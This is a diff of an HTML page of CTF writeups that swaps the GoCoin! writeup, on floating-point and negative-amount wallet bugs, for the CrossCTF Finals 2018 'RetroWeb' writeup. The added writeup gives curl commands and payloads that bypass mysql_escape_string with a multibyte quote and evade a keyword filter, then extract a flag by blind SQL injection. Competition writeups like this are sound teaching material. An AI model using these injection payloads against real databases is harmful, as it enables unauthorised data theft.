@@ -13,7 +13,7 @@
         <meta name="description" content="Our CTF writeups">
       
       
-        <link rel="canonical" href="https://osilayer8.cf/crossctf-finals2018/web/gocoin/README/">
+        <link rel="canonical" href="https://osilayer8.cf/crossctf-finals2018/web/retroweb/README/">
       
       
         <meta name="author" content="OSI Layer 8">
@@ -42,7 +42,7 @@
     
     
       
-        <title>GoCoin! - OSI Layer 8</title>
+        <title>RetroWeb - OSI Layer 8</title>
       
     
     
@@ -104,7 +104,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
-      <a href="#crossctf-finals-2018-gocoin-web" tabindex="1" class="md-skip">
+      <a href="#crossctf-finals-2018-retroweb-web" tabindex="1" class="md-skip">
         Skip to content
       </a>
     
@@ -130,7 +130,7 @@
                 OSI Layer 8
               </span>
               <span class="md-header-nav__topic">
-                GoCoin!
+                RetroWeb
               </span>
             
           
@@ -539,56 +539,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-      
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        GoCoin!
-      </label>
-    
-    <a href="./" title="GoCoin!" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../../gocoin/README/" title="GoCoin!" class="md-nav__link">
       GoCoin!
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">Table of contents</label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#challenge" title="Challenge" class="md-nav__link">
-    Challenge
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#alternative-exploit" title="Alternative exploit" class="md-nav__link">
-    Alternative exploit
-  </a>
-  
-</li>
-      
-      
-      
-      
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -632,11 +587,49 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../../retroweb/README/" title="RetroWeb" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        RetroWeb
+      </label>
+    
+    <a href="./" title="RetroWeb" class="md-nav__link md-nav__link--active">
       RetroWeb
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge" title="Challenge" class="md-nav__link">
+    Challenge
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
         
@@ -809,13 +802,6 @@
   
 </li>
       
-        <li class="md-nav__item">
-  <a href="#alternative-exploit" title="Alternative exploit" class="md-nav__link">
-    Alternative exploit
-  </a>
-  
-</li>
-      
       
       
       
@@ -832,27 +818,76 @@
             <article class="md-content__inner md-typeset">
               
                 
-                  <a href="https://github.com/nushosilayer8/writeups/edit/master/writeups/crossctf-finals2018/web/gocoin/README.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                  <a href="https://github.com/nushosilayer8/writeups/edit/master/writeups/crossctf-finals2018/web/retroweb/README.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                <h1 id="crossctf-finals-2018-gocoin-web">CrossCTF Finals 2018: GoCoin! (web)</h1>
+                <h1 id="crossctf-finals-2018-retroweb-web">CrossCTF Finals 2018: RetroWeb (web)</h1>
 <blockquote>
-<p>I thought blockchain was cool, so I made my own coin.</p>
-<p>http://ctf.pwn.sg:8182</p>
-<p>Creator - quanyang (@quanyang)</p>
+<p>Not so easy SQL injection at all.</p>
+<p>http://ctf.pwn.sg:8180</p>
 </blockquote>
 <h2 id="challenge">Challenge</h2>
-<p>We are given a nice site, that emulates a wallet. </p>
-<p><img alt="Site" src="../site.png" /></p>
-<p>Clicking on deposit and withdraw goes to <code>/deposit?amount=1</code> and <code>/withdraw?amount=1</code> respectively. Instincts are to see if you can input other amounts. </p>
-<p><img alt="0.3 deposited" src="../point3.png" /></p>
-<p>Messing around, we figured out that if you keep adding 0.01 coins, you'll encounter some nice floating point math quirks. (Doesn't it remind you of <a href="https://nusmods.com/modules/CS2100/computer-organisation">Computer Organisation</a> lessons?)</p>
-<p>If you continue until you have 0.35000000000000003 coins, then start adding 0.005 coins, you can fill your bank while having 0.35000000000000003 coins in your wallet! </p>
-<p><img alt="0.35 magic" src="../flaggy.gif" /></p>
-<p>I'm not gonna go into floating point operations and stop here. Must have been some <a href="https://github.com/NUSGreyhats/crossctf-2018-challenges/blob/master/finals/challenges/GoCoin!/service/src/main.go#L110-L113">rounding errors!</a></p>
-<h2 id="alternative-exploit">Alternative exploit</h2>
-<p>Yes, I actually missed this exploit that I only realised in <a href="../../gocoinplus/">GoCoin! Plus</a>. You could simply specify negative amounts because it missed out negative checks:</p>
-<p><img alt="Alternative" src="../alt.png" /></p>
+<p>It says it on the tin. Not so easy SQL injection. Dig straight in to the code:</p>
+<pre><code>if (preg_match('/\s/', $username) or 
+    preg_match('/[\/\\\\]/', $username) or 
+    preg_match('/(and|or|null|not|union|select|from|where|group|order|having|limit|into|file|case|like)/i', $username) or 
+    preg_match('/(--|\/\*|=|&gt;|&lt;)/', $username)) 
+    exit('die hax0r!');
+$username = mysql_escape_string($username);
+$sql = &quot;SELECT username FROM users WHERE username like '$username';&quot;;
+$result = $conn-&gt;query($sql);
+</code></pre>
+
+<p>So this thing does SQL keyword filtering and <code>mysql_escape_string</code>. Seems impossible? It's not, ask Google. Some clicks brought me to <a href="https://pentesterlab.com/exercises/web_for_pentester_II/course">this site's example 9</a> with a description of how to bypass mysql_escape_string. A nice hint in that example also tells you the use of this exploit: for playing CTFs! </p>
+<p>So let's first try bypassing <code>mysql_escape_string</code>: </p>
+<pre><code>curl -v -X POST http://ctf.pwn.sg:8180/\?search -d username=&quot;$(echo -e &quot;SELECT&quot;)&quot;
+&gt; die hax0r!
+curl -v -X POST http://ctf.pwn.sg:8180/\?search -d username=&quot;$(echo -e &quot;\xbf'NOPE&quot;)&quot;
+&gt; Nothing returned. (this means an SQL error occurred)
+curl -v -X POST http://ctf.pwn.sg:8180/\?search -d username=&quot;$(echo -e &quot;\xbf'#&quot;)&quot;
+&gt; Does not exist.
+</code></pre>
+
+<p>Yes! So the quote escaping is valid! We can now add additional statements behind our quote. Next step is to bypass SQL keyword filtering. </p>
+<p>A site that provided us with background on <a href="https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/">bypassing SQL statement filtering</a> gave us a lot of information and basics on how to write an SQL statement that bypasses the filter. Combined with the MySQL documentation, and lots of trial and error, we found out the following: </p>
+<ol>
+<li>You can wrap things in brackets to not need to use spaces. <code>OR(1)=(1)</code></li>
+<li>Use <code>&amp;&amp;</code> and <code>||</code> instead of <code>AND</code> and <code>OR</code></li>
+<li>Instead of using <code>UNION</code>, do a comparison and use the returned result to check</li>
+<li>Instead of using <code>=</code>, you can use <code>IN</code></li>
+<li>Instead of strings, you can use hex characters</li>
+<li>You can compare the substring of the flag by using <code>substr</code></li>
+</ol>
+<p>The guide on bypassing tells us that with all the keywords the filter blocked, we have to resort to blind SQL injection. It's where you compare a column character by character to determine if that character is contained in the column. In this case, we want to brute force every character of the flag out, given 1 bit (Exists or Does not exist) of information. </p>
+<p>Firstly, we need a way to check for the first character. Let's start with a simple statement. </p>
+<pre><code>admin' OR 'C' in substr(flag,1,1)
+</code></pre>
+
+<p>Let's remove the <code>AND</code> and spaces:</p>
+<pre><code>admin'||('C')in(substr(flag,1,1))
+</code></pre>
+
+<p>We also need to remove the quotes and ignore everything else:</p>
+<pre><code>admin'||(0x43)in(substr(flag,1,1))#
+</code></pre>
+
+<p>Test it out:</p>
+<pre><code>curl -v -X POST http://ctf.pwn.sg:8180/\?search -d username=&quot;$(echo -e &quot;admin\xbf'||((0x43)in(substr(flag,1,1)))#&quot;)&quot;
+</code></pre>
+
+<p>Yay, we get <code>Exists</code>! The flag starts with 'C'</p>
+<p>To extract the next character, you'd simply increase the length of the substring and the length of the hex string you're testing against, like so:</p>
+<pre><code>payload := fmt.Sprintf(&quot;username=%%BF'||(0x%x)IN(substr(flag,1,%d))#&quot;, str, len(str))
+</code></pre>
+
+<p>So, we looped through all possible characters one by one until we got the first, then the next, then the next. The flag <code>CROSSCTF{WHY</code> was slowly forming but then we realised that it was in all caps! The <code>IN</code> comparison is case-insensetive! </p>
+<p>Simple fix, that took us a while:</p>
+<pre><code>payload := fmt.Sprintf(&quot;username=%%BF'||(hex(0x%x))IN(hex(substr(flag,1,%d)))#&quot;, str, len(str))
+</code></pre>
+
+<p><a href="../sql.go">Complete code here</a></p>
+<p><strong>It looks beautiful!</strong></p>
+<script src="https://asciinema.org/a/xsraeQYCb9Xya1WXB34uQYTCg.js" id="asciicast-xsraeQYCb9Xya1WXB34uQYTCg" async></script>
                 
                   
                 
@@ -873,7 +908,7 @@
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../../../re/rochefort8/README/" title="Tower Of Beer: Rochefort 8" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../../terminal/README/" title="The Terminal" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -882,19 +917,19 @@
                 <span class="md-footer-nav__direction">
                   Previous
                 </span>
-                Tower Of Beer: Rochefort 8
+                The Terminal
               </span>
             </div>
           </a>
         
         
-          <a href="../../gocoinplus/README/" title="GoCoin! Plus" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../../../crypto/fitblips/README/" title="Fitblips" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                GoCoin! Plus
+                Fitblips
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
